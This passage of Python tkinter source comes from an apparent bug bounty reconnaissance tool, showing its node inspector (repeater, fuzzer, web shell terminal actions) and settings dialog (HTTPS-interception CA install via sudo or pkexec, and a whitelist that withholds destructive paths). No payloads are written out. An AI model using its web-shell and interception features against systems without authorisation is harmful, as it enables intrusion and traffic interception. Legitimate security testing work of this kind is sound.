        # Explicit height makes the button exactly 1px taller than its natural
        # 18px (symmetric pady/bd can only add even pixels).
        btns.place(relx=1.0, rely=0.0, anchor='ne', x=-4, y=2, height=19)
        # Per-node actions live in a single "Options" dropdown (same style as the
        # Site Structure graph's Options menu) to keep the inspector header compact.
        opt_btn = tk.Menubutton(btns, text='Options ▾', bg=C['btn'],
                                activebackground=C['btn'], relief='raised',
                                bd=1, pady=0, font=C['font'], padx=6,
                                highlightthickness=0)
        menu = tk.Menu(opt_btn, tearoff=0, bg=C['btn'], fg=C['black'],
                       activebackground=C['sel_bg'], activeforeground=C['sel_fg'],
                       font=C['font'])
        menu.add_command(label='Analyze with AI', command=self._ai_analyze)
        menu.add_command(label='Open in Browser', command=self._open_in_browser)
        menu.add_separator()
        menu.add_command(label='Send to Repeater', command=self._open_repeater)
        menu.add_command(label='Send to Fuzzer', command=self._open_fuzzer)
        menu.add_separator()
        menu.add_command(label='Set Shell', command=self._set_shell)
        # 'Open Shell' stays disabled (greyed) until a shell-type node is
        # selected; show()/clear() toggle this entry by its index.
        menu.add_command(label='Open Shell', command=self._open_shell,
                         state='disabled')
        self._open_shell_idx = menu.index('end')
        opt_btn.config(menu=menu)
        opt_btn.pack(side='left', fill='y')   # fill the placed (19px) height
        self._opt_menu = menu

        # Tab: Overview
        t0 = tk.Frame(nb, bg=C['bg'])
        nb.add(t0, text='Overview')
        self.ov_vars = {}
        # Two pairs per row: URL | Type, then Status | Title
        for lbl, key, r, c in [
            ('URL',    'url',    0, 0),
            ('Type',   'type',   0, 2),
            ('Status', 'status', 1, 0),
            ('Title',  'title',  1, 2),
        ]:
            tk.Label(t0, text=lbl + ':', bg=C['bg'], font=C['font_b'],
                     anchor='w').grid(row=r, column=c, sticky='w', padx=6, pady=1)
            v = tk.StringVar(value='—')
            self.ov_vars[key] = v
            Entry95(t0, textvariable=v, width=24, state='readonly',
                    readonlybackground=C['window']).grid(
                row=r, column=c + 1, sticky='ew', padx=6, pady=1)

        # Content-Type spans the full width on its own row
        tk.Label(t0, text='Content-Type:', bg=C['bg'], font=C['font_b'],
                 anchor='w').grid(row=2, column=0, sticky='w', padx=6, pady=1)
        v = tk.StringVar(value='—')
        self.ov_vars['ctype'] = v
        Entry95(t0, textvariable=v, state='readonly',
                readonlybackground=C['window']).grid(
            row=2, column=1, columnspan=3, sticky='ew', padx=6, pady=1)

        t0.columnconfigure(1, weight=1)
        t0.columnconfigure(3, weight=1)

        tk.Label(t0, text='Links:', bg=C['bg'], font=C['font_b']).grid(
            row=3, column=0, columnspan=4, sticky='w', padx=6, pady=(6, 1))
        lf = tk.Frame(t0, bg=C['bg'])
        lf.grid(row=4, column=0, columnspan=4, sticky='nsew', padx=6, pady=2)
        t0.rowconfigure(4, weight=1)
        self.links_lb = tk.Listbox(lf, bg=C['window'], fg=C['black'],
                                   font=C['mono'], selectbackground=C['sel_bg'],
                                   selectforeground=C['sel_fg'], relief='sunken',
                                   bd=2, activestyle='none', highlightthickness=0)
        sb = tk.Scrollbar(lf, orient='vertical', command=self.links_lb.yview)
        self.links_lb.config(yscrollcommand=sb.set)
        self.links_lb.pack(side='left', fill='both', expand=True)
        sb.pack(side='right', fill='y')

        # Tab: Content
        t1 = tk.Frame(nb, bg=C['bg'])
        nb.add(t1, text='Content')
        cf, self.content_txt = self._scrolled_text(t1)
        cf.pack(fill='both', expand=True, padx=2, pady=2)

        # Tab: Req / Resp  — request on the left, response on the right
        t4 = tk.Frame(nb, bg=C['bg'])
        nb.add(t4, text='Req / Resp')

        req_col = tk.Frame(t4, bg=C['bg'])
        req_col.pack(side='left', fill='both', expand=True, padx=(4, 2), pady=2)
        tk.Label(req_col, text='Request:', bg=C['bg'], font=C['font_b']).pack(anchor='w')
        qf, self.req_txt = self._scrolled_text(req_col)
        qf.pack(fill='both', expand=True, pady=(2, 0))

        resp_col = tk.Frame(t4, bg=C['bg'])
        resp_col.pack(side='left', fill='both', expand=True, padx=(2, 4), pady=2)
        tk.Label(resp_col, text='Response:', bg=C['bg'], font=C['font_b']).pack(anchor='w')
        sf, self.resp_txt = self._scrolled_text(resp_col)
        sf.pack(fill='both', expand=True, pady=(2, 0))

        # Tab: AI Insight
        self.t_ai = tk.Frame(nb, bg=C['bg'])
        nb.add(self.t_ai, text='AI Insight')
        af, self.ai_txt = self._scrolled_text(self.t_ai, wrap='word')
        af.pack(fill='both', expand=True, padx=2, pady=2)

    def _scrolled_text(self, parent, **kw):
        """Read-only Text95 with a vertical scrollbar; adds a horizontal
        scrollbar only when wrap='none' (since wrap='word'/'char' have nothing
        to scroll horizontally). Returns (container_frame, text_widget)."""
        wrap = kw.get('wrap', 'none')
        frame = tk.Frame(parent, bg=C['bg'])
        txt = Text95(frame, width=10, height=4, **kw)
        vsb = tk.Scrollbar(frame, orient='vertical', command=txt.yview)
        txt.config(yscrollcommand=vsb.set)
        txt.grid(row=0, column=0, sticky='nsew')
        vsb.grid(row=0, column=1, sticky='ns')
        frame.rowconfigure(0, weight=1)
        frame.columnconfigure(0, weight=1)
        if wrap == 'none':
            hsb = tk.Scrollbar(frame, orient='horizontal', command=txt.xview)
            txt.config(xscrollcommand=hsb.set)
            hsb.grid(row=1, column=0, sticky='ew')
        return frame, txt

    def show(self, node: SiteNode):
        """Populate the inspector from `node`: overview fields, links, content,
        data-in/out, request/response and the AI-insight state."""
        self.node = node
        self.ov_vars['url'].set(node.url)
        nvar = len(getattr(node, 'locale_variants', []) or [])
        self.ov_vars['type'].set(
            f'{node.node_type}  (+{nvar} locales)' if nvar > 1 else node.node_type)
        self.ov_vars['status'].set(node_status_label(node))
        self.ov_vars['title'].set(node.title or '—')
        self.ov_vars['ctype'].set(node.content_type or '—')
        # Open Shell only works on a shell-type node.
        self._opt_menu.entryconfig(
            self._open_shell_idx,
            state=('normal' if node.node_type == 'shell' else 'disabled'))

        self.links_lb.delete(0, 'end')
        for lnk in node.links:
            self.links_lb.insert('end', lnk)

        body = node.text_content or node.raw_html or 'No content'
        variants = getattr(node, 'locale_variants', []) or []
        if len(variants) > 1:
            body = (f'[Representative of {len(variants)} locale variants: '
                    f'{", ".join(variants)}]\n'
                    f'[Swap the locale path segment to reach a specific one.]\n\n'
                    + body)
        self.content_txt.set_content(body)
        self.req_txt.set_content(self._fmt_request(node))
        self.resp_txt.set_content(self._fmt_response(node))
        if node.ai_insight:
            self.ai_txt.set_content(node.ai_insight)
        elif node.ai_running:
            self.ai_txt.set_content('Analyzing… please wait.')
        else:
            self.ai_txt.set_content('Click "Analyze with AI" for security insights.')

    def clear(self):
        """Reset the inspector to its empty state (no node selected)."""
        self.node = None
        self._opt_menu.entryconfig(self._open_shell_idx, state='disabled')
        for k in self.ov_vars:
            self.ov_vars[k].set('')
        self.links_lb.delete(0, 'end')
        for txt, msg in ((self.content_txt, 'No node selected.'),
                         (self.req_txt, ''), (self.resp_txt, ''),
                         (self.ai_txt, 'Select a node and click "Analyze with AI".')):
            txt.set_content(msg)

    @staticmethod
    def _pretty_body(body: str) -> str:
        """Pretty-print a JSON request/response body (indented, multi-line).
        Non-JSON bodies are returned unchanged."""
        s = (body or '').strip()
        if not s or s[0] not in '{[':
            return body
        try:
            return json.dumps(json.loads(s), indent=2, ensure_ascii=False)
        except Exception:
            return body

    @staticmethod
    def _fmt_request(node: SiteNode) -> str:
        """Format the node's captured request as a raw HTTP request string."""
        if not node.req_method:
            return 'No request captured (requests not available or fetch failed).'
        p = urlparse(node.req_url)
        path = (p.path or '/') + (('?' + p.query) if p.query else '')
        lines = [f'{node.req_method} {path} HTTP/1.1',
                 f'Host: {p.netloc}']
        lines += [f'{k}: {v}' for k, v in node.req_headers.items()
                  if k.lower() != 'host']
        if node.req_body:
            lines += ['', InfoPanel._pretty_body(node.req_body)]
        return '\n'.join(lines)

    @staticmethod
    def _fmt_response(node: SiteNode) -> str:
        """Format the node's captured response as a raw HTTP response string."""
        if node.resp_status is None:
            state = getattr(node, 'probe_state', 'ok')
            if state == 'error':
                why = getattr(node, 'error_reason', '') or 'unknown error'
                return ('No response — the request never completed.\n'
                        f'Transport error: {why}')
            if state == 'unsent':
                return (node.resp_body or
                        'Not sent — unsafe method observed but not replayed. '
                        'Open in the Repeater to send it.')
            return 'No response captured.'
        lines = [f'HTTP/1.1 {node.resp_status} {node.resp_reason}']
        lines += [f'{k}: {v}' for k, v in node.resp_headers.items()]
        lines.append('')
        lines.append(InfoPanel._pretty_body(node.resp_body) if node.resp_body
                     else '(empty body)')
        return '\n'.join(lines)

    def _ai_analyze(self):
        """Run an AI analysis of the selected node on a background thread and show
        the result in the AI tab; the insight is cached on the node."""
        if not self.node:
            messagebox.showinfo('No Node', 'Select a node in the graph first.')
            return
        node = self.node
        self.nb.select(self.t_ai)
        if node.ai_running:
            self.ai_txt.set_content('Analyzing… please wait.')
            return
        self.ai_txt.set_content('Analyzing… please wait.')
        node.ai_running = True

        def run():
            """Worker: analyse the node, store the result on it, and refresh the
            widget only if that node is still the one on screen."""
            insight = self.ai.analyze_node(node)
            node.ai_insight = insight
            node.ai_running = False
            def update():
                """Update the AI text on the UI thread if `node` is still shown."""
                if self.node is node:
                    self.ai_txt.set_content(insight)
            try:
                self.after(0, update)
            except Exception:
                pass

        threading.Thread(target=run, daemon=True).start()

    def _open_in_browser(self):
        """Open the selected node's URL in the system web browser."""
        if not self.node or not self.node.url:
            return
        webbrowser.open(self.node.url, new=2)

    def _open_repeater(self):
        """Open the Repeater dialog seeded with the selected node's request."""
        if not self.node:
            messagebox.showinfo('No Node', 'Select a node in the graph first.')
            return
        inspector.repeater(self.winfo_toplevel(), self.node,
                           on_save=self.on_new_node)

    def _open_fuzzer(self):
        """Open the Fuzzer dialog seeded with the selected node's request."""
        if not self.node:
            messagebox.showinfo('No Node', 'Select a node in the graph first.')
            return
        inspector.fuzzer(self.winfo_toplevel(), self.node, on_save=self.on_new_node)

    def _set_shell(self):
        """Create a web shell as a CHILD of the selected node: prompt for the
        shell file name/path and the command parameter, then spawn a new 'shell'
        node under the selected one (the app wires the edge and selects it)."""
        if not self.node:
            messagebox.showinfo('No Node', 'Select a node in the graph first.')
            return
        node = self.node

        def apply(name, param, method):
            """Hand the entered shell name/param/method to the app to create the
            child shell node."""
            if self.on_create_shell:
                self.on_create_shell(node, name, param, method)

        SetShellDialog(self.winfo_toplevel(), node, on_apply=apply)

    def _open_shell(self):
        """Open the interactive Web Shell terminal for the selected shell node."""
        if not self.node:
            messagebox.showinfo('No Node', 'Select a node in the graph first.')
            return
        if self.node.node_type != 'shell':
            messagebox.showinfo(
                'Not a Shell',
                'This node is not a shell. Use "Set Shell" first to define the '
                'shell file name and command parameter.')
            return
        inspector.shell(self.winfo_toplevel(), self.node)



# ─────────────────────────────────────────────
# Settings dialog
# ─────────────────────────────────────────────
class SettingsDialog(ModalToplevel):
    """The Settings dialog: edit the AI model/host/temperature, interface
    options (font size, icon resolution) and view the About tab. Calls
    `on_apply` with the gathered settings dict when applied."""
    def __init__(self, parent, settings, on_apply, ai,
                 get_log=None, clear_log=None):
        """Copy the current settings, build the tabbed UI and centre the dialog
        over its parent. `get_log`/`clear_log` back the Logs tab."""
        super().__init__(parent)
        self.settings = dict(settings)
        self.on_apply = on_apply
        self.ai = ai
        self.get_log = get_log
        self.clear_log = clear_log

        self.title('Settings')
        self.configure(bg=C['bg'])
        self.resizable(False, False)

        # Buttons first so the OK/Apply/Cancel bar is reserved at the bottom
        # before the notebook claims the remaining space: the dialog has a fixed
        # height, and packing the bar after the expanding notebook let it get
        # squeezed off the bottom (the bar vanished once geometry clamped the
        # window down from its natural size).
        self._build_buttons()
        self._build_tabs()

        self.update_idletasks()
        px = parent.winfo_rootx() + parent.winfo_width()  // 2 - 230
        py = parent.winfo_rooty() + parent.winfo_height() // 2 - 200
        self.geometry(f'460x420+{max(px, 0)}+{max(py, 0)}')

    # ── Tabs ────────────────────────────────
    def _build_tabs(self):
        """Build the notebook with the AI, Performance, Interface, Logs and About
        tabs."""
        wrap = tk.Frame(self, bg=C['bg'])
        wrap.pack(fill='both', expand=True, padx=8, pady=6)
        nb = ttk.Notebook(wrap)
        nb.pack(fill='both', expand=True)
        self._tab_ai(nb)
        self._tab_performance(nb)
        self._tab_proxy(nb)
        self._tab_interface(nb)
        self._tab_logs(nb)
        self._tab_about(nb)

    def _tab_ai(self, nb):
        """Build the AI/Ollama tab (model, host + test, temperature)."""
        page = tk.Frame(nb, bg=C['bg'], padx=12, pady=10)
        nb.add(page, text='  AI / Ollama  ')
        page.columnconfigure(1, weight=1)

        tk.Label(page, text='AI Model:', bg=C['bg'], font=C['font_b'],
                 anchor='w', width=14).grid(row=0, column=0, sticky='w', pady=6)
        self._model_var = tk.StringVar(value=self.settings.get('model', 'reconner-ai'))
        Entry95(page, textvariable=self._model_var).grid(
            row=0, column=1, sticky='ew', padx=(6, 0), pady=6)

        tk.Label(page, text='Wizard Model:', bg=C['bg'], font=C['font_b'],
                 anchor='w', width=14).grid(row=1, column=0, sticky='w', pady=6)
        self._wizard_model_var = tk.StringVar(
            value=self.settings.get('wizard_model', 'wizard-ai'))
        Entry95(page, textvariable=self._wizard_model_var).grid(
            row=1, column=1, sticky='ew', padx=(6, 0), pady=6)

        tk.Label(page, text='Ollama Host:', bg=C['bg'], font=C['font_b'],
                 anchor='w', width=14).grid(row=2, column=0, sticky='w', pady=6)
        self._host_var = tk.StringVar(
            value=self.settings.get('ollama_host', 'http://localhost:11434'))
        Entry95(page, textvariable=self._host_var).grid(
            row=2, column=1, sticky='ew', padx=(6, 0), pady=6)

        status = tk.Frame(page, bg=C['bg'])
        status.grid(row=3, column=0, columnspan=2, sticky='ew', pady=(0, 6))
        self._conn_lbl = tk.Label(status, text='○  Not tested', bg=C['bg'],
                                  font=C['font'], fg=C['shadow'])
        self._conn_lbl.pack(side='left')
        Btn(status, text='Test Connection',
            command=self._test_connection).pack(side='right')

        ttk.Separator(page, orient='horizontal').grid(
            row=4, column=0, columnspan=2, sticky='ew', pady=8)

        tk.Label(page, text='Temperature:', bg=C['bg'], font=C['font_b'],
                 anchor='w', width=14).grid(row=5, column=0, sticky='w', pady=6)
        tf = tk.Frame(page, bg=C['bg'])
        tf.grid(row=5, column=1, sticky='ew', padx=(6, 0), pady=6)
        self._temp_var = tk.DoubleVar(value=self.settings.get('temperature', 0.7))
        tk.Scale(tf, variable=self._temp_var, from_=0.0, to=2.0, resolution=0.05,
                 orient='horizontal', bg=C['bg'], fg=C['black'],
                 troughcolor=C['window'], highlightthickness=0,
                 length=200, sliderlength=16, font=C['font']).pack(side='left')
        tk.Label(tf, textvariable=self._temp_var, bg=C['bg'],
                 font=C['font_b'], width=4).pack(side='left', padx=4)

    def _tab_interface(self, nb):
        """Build the Interface tab (font size)."""
        page = tk.Frame(nb, bg=C['bg'], padx=12, pady=10)
        nb.add(page, text='  Interface  ')
        page.columnconfigure(1, weight=1)

        tk.Label(page, text='Font Size:', bg=C['bg'], font=C['font_b'],
                 anchor='w', width=14).grid(row=0, column=0, sticky='w', pady=8)
        self._font_var = tk.IntVar(value=self.settings.get('font_size', 8))
        tk.Spinbox(page, textvariable=self._font_var, from_=7, to=14, increment=1,
                   width=5, bg=C['window'], fg=C['black'], relief='sunken',
                   bd=2, font=C['font']).grid(row=0, column=1, sticky='w',
                                              padx=(6, 0), pady=8)
        tk.Label(page, text='(restart app to apply)', bg=C['bg'],
                 fg=C['shadow'], font=C['font']).grid(
            row=1, column=0, columnspan=2, sticky='w')

    def _tab_proxy(self, nb):
        """Build the Proxy tab — the intercepting-proxy listen port plus the CA
        certificate path / export / system-install actions used for HTTPS
        interception."""
        page = tk.Frame(nb, bg=C['bg'], padx=12, pady=10)
        nb.add(page, text='  Proxy  ')
        page.columnconfigure(1, weight=1)

        tk.Label(page, text='Proxy port:', bg=C['bg'], font=C['font_b'],
                 anchor='w', width=14).grid(row=0, column=0, sticky='w', pady=8)
        self._proxy_port_var = tk.IntVar(
            value=int(self.settings.get('proxy_port', 8080)))
        tk.Spinbox(page, textvariable=self._proxy_port_var, from_=1, to=65535,
                   increment=1, width=8, bg=C['window'], fg=C['black'],
                   relief='sunken', bd=2, font=C['font']).grid(
            row=0, column=1, sticky='w', padx=(6, 0), pady=8)
        tk.Label(page, text='(127.0.0.1 only; applied on Apply)', bg=C['bg'],
                 fg=C['shadow'], font=C['font']).grid(
            row=1, column=0, columnspan=2, sticky='w')

        ttk.Separator(page, orient='horizontal').grid(
            row=2, column=0, columnspan=2, sticky='ew', pady=10)

        avail = CRYPTO_AVAILABLE
        tk.Label(page, text='HTTPS interception CA:', bg=C['bg'],
                 font=C['font_b']).grid(row=3, column=0, columnspan=2, sticky='w')
        tk.Label(page, text=str(PROXY_CA_CERT), bg=C['bg'], fg=C['title_bg'],
                 font=C['mono'], anchor='w').grid(
            row=4, column=0, columnspan=2, sticky='w', pady=(2, 6))
        if not avail:
            tk.Label(page, text='(install the "cryptography" package to enable '
                     'HTTPS interception)', bg=C['bg'], fg=C['err'],
                     font=C['font']).grid(row=5, column=0, columnspan=2, sticky='w')
        bar = tk.Frame(page, bg=C['bg'])
        bar.grid(row=6, column=0, columnspan=2, sticky='w', pady=(4, 0))
        Btn(bar, text='Export CA cert…',
            command=self._export_ca).pack(side='left')
        Btn(bar, text='Install into system trust',
            command=self._install_ca_system).pack(side='left', padx=6)
        tk.Label(page, text='Trust this CA in your browser to intercept HTTPS '
                 'without warnings.', bg=C['bg'], fg=C['shadow'],
                 font=C['font']).grid(row=7, column=0, columnspan=2,
                                      sticky='w', pady=(6, 0))

    def _export_ca(self):
        """Save a copy of the proxy CA cert for manual import into a browser."""
        if not PROXY_CA_CERT.exists():
            messagebox.showinfo('No CA yet',
                                'The CA is generated when the proxy first starts.')
            return
        fn = self.run_child_dialog(
            filedialog.asksaveasfilename, title='Export proxy CA certificate',
            defaultextension='.crt', initialfile='reconner-ca.crt',
            filetypes=[('Certificate', '*.crt *.pem'), ('All files', '*.*')])
        if not fn:
            return
        try:
            shutil.copyfile(PROXY_CA_CERT, fn)
            messagebox.showinfo('Exported', f'CA written to:\n{fn}')
        except Exception as e:
            messagebox.showerror('Export error', str(e))

    def _install_ca_system(self):
        """Install the CA into the system trust store (update-ca-certificates).
        Uses pkexec (graphical password prompt) when available, else sudo. Firefox
        also needs security.enterprise_roots.enabled to read the system store."""
        if not PROXY_CA_CERT.exists():
            messagebox.showinfo('No CA yet',
                                'The CA is generated when the proxy first starts.')
            return
        msg = ('This copies the CA into /usr/local/share/ca-certificates and runs '
               'update-ca-certificates (needs root). Continue?')
        if not self.run_child_dialog(messagebox.askokcancel,
                                     'Install CA into system trust', msg):
            return
        cmd = (f'install -m644 "{PROXY_CA_CERT}" "{PROXY_CA_SYS_DST}" '
               '&& update-ca-certificates')
        runner = (['pkexec', 'sh', '-c', cmd] if shutil.which('pkexec')
                  else ['sudo', 'sh', '-c', cmd])
        try:
            r = subprocess.run(runner, capture_output=True, text=True, timeout=120)
            if r.returncode == 0:
                messagebox.showinfo(
                    'Installed',
                    'CA installed into the system trust store.\n\n'
                    'Chromium/Chrome will trust it now. For Firefox, set '
                    'security.enterprise_roots.enabled = true in about:config '
                    '(the Reconner-launched Firefox already does this).')
            else:
                messagebox.showerror(
                    'Install failed',
                    (r.stderr or r.stdout or 'unknown error')[:500])
        except Exception as e:
            messagebox.showerror('Install failed', str(e))

    def _tab_performance(self, nb):
        """Build the Performance tab — concurrent-browser and fingerprint-worker
        limits plus the safe-path allowlist deciding which non-GET endpoints the
        crawler auto-probes (and recovers params for). One glob per line; '#'
        starts a comment. Destructive paths are always withheld."""
        page = tk.Frame(nb, bg=C['bg'], padx=12, pady=10)
        nb.add(page, text='  Performance  ')

        # ── Concurrency controls: browser + fingerprint limits. Laid out in a
        # shared grid so the spinboxes line up under one column regardless of the
        # differing label widths (a proportional font makes packed labels unequal).
        nums = tk.Frame(page, bg=C['bg'])
        nums.pack(fill='x', pady=(0, 6))
        tk.Label(nums, text='Max concurrent browsers:', bg=C['bg'],
                 font=C['font_b'], anchor='w').grid(row=0, column=0, sticky='w', pady=(0, 6))
        self._concurrency_var = tk.IntVar(
            value=max(1, int(self.settings.get('max_concurrent_browsers', 5))))
        tk.Spinbox(nums, textvariable=self._concurrency_var, from_=1, to=20,
                   increment=1, width=5, bg=C['window'], fg=C['black'],
                   relief='sunken', bd=2, font=C['font']).grid(
            row=0, column=1, sticky='w', padx=(6, 0), pady=(0, 6))

        tk.Label(nums, text='Max fingerprint workers:', bg=C['bg'],
                 font=C['font_b'], anchor='w').grid(row=1, column=0, sticky='w')
        self._fp_workers_var = tk.IntVar(
            value=max(1, int(self.settings.get('max_fingerprint_workers', 8))))
        tk.Spinbox(nums, textvariable=self._fp_workers_var, from_=1, to=32,
                   increment=1, width=5, bg=C['window'], fg=C['black'],
                   relief='sunken', bd=2, font=C['font']).grid(
            row=1, column=1, sticky='w', padx=(6, 0))
        ttk.Separator(page, orient='horizontal').pack(fill='x', pady=(2, 8))

        self._wl_enabled = tk.BooleanVar(
            value=bool(self.settings.get('whitelist_enabled', True)))

        top = tk.Frame(page, bg=C['bg'])
        top.pack(fill='x')
        tk.Label(top, text='Safe-path whitelist:', bg=C['bg'],
                 font=C['font_b']).pack(side='left')
        self._wl_toggle = Btn(top, text='', command=self._toggle_whitelist)
        self._wl_toggle.pack(side='right')
        self._refresh_wl_toggle()

        bar = tk.Frame(page, bg=C['bg'])
        bar.pack(fill='x', pady=(6, 0))
        Btn(bar, text='Load list…', command=self._load_whitelist).pack(side='left')
        Btn(bar, text='Reset',
            command=lambda: self._wl_txt.set_content(DEFAULT_SAFE_PATHS)
            ).pack(side='left', padx=4)

        # Explicit small width/height so the Text's natural size (default 80x24)
        # can't force the fixed-size dialog; fill='both'+expand lets it grow to
        # take exactly the space left below the controls.
        tw = tk.Frame(page, bg=C['bg'])
        tw.pack(fill='both', expand=True, pady=(6, 0))
        self._wl_txt = EditText95(tw, width=40, height=8)
        sb = tk.Scrollbar(tw, orient='vertical', command=self._wl_txt.yview)
        self._wl_txt.config(yscrollcommand=sb.set)
        self._wl_txt.pack(side='left', fill='both', expand=True)
        sb.pack(side='right', fill='y')
        self._wl_txt.set_content(
            self.settings.get('whitelist_paths') or DEFAULT_SAFE_PATHS)

    def _refresh_wl_toggle(self):
        """Repaint the on/off toggle: green ON, red OFF."""
        on = self._wl_enabled.get()
        self._wl_toggle.config(text='  ON  ' if on else '  OFF  ',
                               bg=('#2e7d32' if on else '#b71c1c'), fg='white')

    def _toggle_whitelist(self):
        """Flip the whitelist on/off. Turning it OFF asks for confirmation first,
        since it lets the crawler auto-probe every non-destructive non-GET path
        (not just the safe-listed ones)."""
        if self._wl_enabled.get():
            if not self.run_child_dialog(
                    messagebox.askokcancel, 'Disable whitelist?',
                    'Turning the safe-path whitelist OFF lets the crawler '
                    'auto-probe (send + recover params for) EVERY non-GET path '
                    'it finds, not just the safe-listed ones. Destructive paths '
                    '(delete, exec, logout, upload, credential ops) are still '
                    'withheld.\n\nContinue with the whitelist OFF?',
                    icon='warning'):
                return
            self._wl_enabled.set(False)
        else:
            self._wl_enabled.set(True)
        self._refresh_wl_toggle()

    def _load_whitelist(self):
        """Append a file's paths (one per line) to the whitelist textbox."""
        fn = self.run_child_dialog(
            filedialog.askopenfilename, title='Load safe-path list',
            filetypes=[('Text files', '*.txt *.lst *.dict'),
                       ('All files', '*.*')])
        if not fn:
            return
        try:
            with open(fn, 'r', encoding='utf-8', errors='ignore') as f:
                data = f.read()
        except Exception as e:
            messagebox.showerror('Load error', str(e))
            return
        current = self._wl_txt.get('1.0', 'end').rstrip('\n')
        self._wl_txt.set_content((current + '\n' + data) if current else data)

    def _tab_logs(self, nb):
        """Build the Logs tab — a read-only view of the session status log with
        a button to clear it."""
        page = tk.Frame(nb, bg=C['bg'], padx=10, pady=8)
        nb.add(page, text='  Logs  ')

        bar = tk.Frame(page, bg=C['bg'])
        bar.pack(fill='x')
        tk.Label(bar, text='Session log:', bg=C['bg'],
                 font=C['font_b']).pack(side='left')
        Btn(bar, text='Clear Log', command=self._clear_logs).pack(side='right')

        tw = tk.Frame(page, bg=C['bg'])
        tw.pack(fill='both', expand=True, pady=(4, 0))
        self._log_txt = Text95(tw)
        sb = tk.Scrollbar(tw, orient='vertical', command=self._log_txt.yview)
        self._log_txt.config(yscrollcommand=sb.set)
        self._log_txt.pack(side='left', fill='both', expand=True)
        sb.pack(side='right', fill='y')

        text = self.get_log() if self.get_log else ''
        self._log_txt.set_content(text or '(no log entries yet)')
        self._log_txt.see('end')

    def _clear_logs(self):
        """Clear the rolling session log and empty the on-screen view."""
        if self.clear_log:
            self.clear_log()
        self._log_txt.set_content('')

    def _tab_about(self, nb):
        """Build the About tab (version, description, dependency status)."""
        page = tk.Frame(nb, bg=C['bg'], padx=14, pady=14)
        nb.add(page, text='  About  ')

        tk.Label(page, text='Reconner  v1.0.1', bg=C['bg'], fg=C['black'],
                 font=('MS Sans Serif', 12, 'bold')).pack(anchor='w')
        tk.Label(page, text='AI-powered bug bounty reconnaissance tool.',
                 bg=C['bg'], fg=C['black'], font=C['font']).pack(anchor='w', pady=(4, 10))

        ttk.Separator(page, orient='horizontal').pack(fill='x', pady=(0, 10))

        info = tk.Frame(page, bg=C['bg'])
        info.pack(fill='x', anchor='w')
        info.columnconfigure(1, weight=1)

        def row(r, label, value):
            """Add a label/value row at grid row `r`."""
            tk.Label(info, text=label, bg=C['bg'], fg=C['black'], font=C['font_b'],
                     anchor='w', width=14).grid(row=r, column=0, sticky='w', pady=3)
            tk.Label(info, text=value, bg=C['bg'], fg=C['title_bg'], font=C['mono'],
                     anchor='w').grid(row=r, column=1, sticky='w', padx=(6, 0), pady=3)

        deps = ', '.join(d for d, ok in [
            ('Selenium', SELENIUM_AVAILABLE), ('Ollama', OLLAMA_AVAILABLE),
            ('bs4', BS4_AVAILABLE), ('requests', REQUESTS_AVAILABLE)] if ok) or 'none'
        row(0, 'Ollama host:', self.settings.get('ollama_host', 'http://localhost:11434'))
        row(1, 'Model:',       self.settings.get('model', 'reconner-ai'))
        row(2, 'Theme:',       'Chicago95')
        row(3, 'Installed:',   deps)

    # ── Buttons ─────────────────────────────
    def _build_buttons(self):
        """Build the OK / Apply / Cancel button bar."""
        bar = tk.Frame(self, bg=C['bg'])
        bar.pack(side='bottom', fill='x', padx=8, pady=6)
        Btn(bar, text='   OK   ', command=self._ok).pack(side='right', padx=4)
        Btn(bar, text=' Apply ', command=self._apply).pack(side='right', padx=4)
        Btn(bar, text=' Cancel ', command=self.destroy).pack(side='right', padx=4)

    def _gather(self) -> dict:
        """Collect the current widget values into a settings dict."""
        s = dict(self.settings)
        s['model']       = self._model_var.get().strip() or 'reconner-ai'
        s['wizard_model'] = self._wizard_model_var.get().strip() or 'wizard-ai'
        s['ollama_host'] = self._host_var.get().strip().rstrip('/')
        s['temperature'] = round(float(self._temp_var.get()), 2)
        s['font_size']   = int(self._font_var.get())
        s['whitelist_enabled'] = bool(self._wl_enabled.get())
        s['whitelist_paths']   = self._wl_txt.get('1.0', 'end').rstrip('\n')
        s['max_concurrent_browsers'] = max(1, int(self._concurrency_var.get()))
        s['max_fingerprint_workers'] = max(1, int(self._fp_workers_var.get()))
        s['proxy_port'] = max(1, min(65535, int(self._proxy_port_var.get())))
        return s

    def _apply(self):
        """Gather, persist and apply the settings (without closing the dialog)."""
        s = self._gather()
        self.settings = s
        save_settings(s)
        self.on_apply(s)

    def _ok(self):
        """Apply the settings and close the dialog."""
        self._apply()
        try:
            self.destroy()
        except Exception:
            pass

    def _test_connection(self):
        """Test the Ollama host by querying /api/tags on a background thread and
        report the result in the status label."""
        if not REQUESTS_AVAILABLE:
            self._conn_lbl.config(text='✗  requests not installed', fg=C['err'])
            return
        host = self._host_var.get().strip().rstrip('/')
        self._conn_lbl.config(text='○  Testing…', fg=C['shadow'])
        self.update_idletasks()

        def worker():
            """Query the Ollama host and update the status label with the result."""
            try:
                r = requests.get(f'{host}/api/tags', timeout=6)
                r.raise_for_status()
                n = len(r.json().get('models', []))
                msg, color = f'●  Connected — {n} model(s)', C['ok']
            except Exception:
                msg, color = '✗  Could not connect', C['err']
            self.after(0, lambda: self._conn_lbl.config(text=msg, fg=color))

        threading.Thread(target=worker, daemon=True).start()


# ─────────────────────────────────────────────
# Tech fingerprint dialog
# ─────────────────────────────────────────────
class FingerprintDialog(ModalToplevel):
    """Popup that shows a raw technology fingerprint of a target and an AI
    analysis of it. The caller is responsible for caching: this widget just
    displays whatever it's handed via set_fingerprint / set_ai."""

    def __init__(self, parent, target, on_analyze, on_select=None):
        """Build the dialog for `target`.

        on_analyze() asks the app to start/show the AI analysis (the app owns the
        run + cache so it survives this popup closing). on_select(target_url) asks
        the app to load that host's tech scan into this popup (each discovered
        subdomain has its own fingerprint)."""
        super().__init__(parent)
        self.target = target
        self.on_analyze = on_analyze
        self.on_select = on_select

        self.title(f'Tech Scan — {target}')
        self.configure(bg=C['bg'])

        wrap = tk.Frame(self, bg=C['bg'])
        wrap.pack(fill='both', expand=True, padx=8, pady=8)

        # 'Technologies detected:' label on the left, with the Subdomains selector
        # (same style as the Site Structure graph) on the right of the same line,
        # so the user can switch which host's tech scan is shown.
        head = tk.Frame(wrap, bg=C['bg'])
        head.pack(fill='x')
        tk.Label(head, text='Technologies detected:', bg=C['bg'],
                 font=C['font_b']).pack(side='left')
        self._host_var = tk.StringVar(value='')
        self.host_btn = tk.Menubutton(head, text='Subdomains ▾', bg=C['btn'],
                                      activebackground=C['btn'], relief='raised',
                                      bd=2, font=C['font'], padx=6,
                                      highlightthickness=0, state='disabled',
                                      width=SUBDOMAIN_BTN_W, anchor='w')
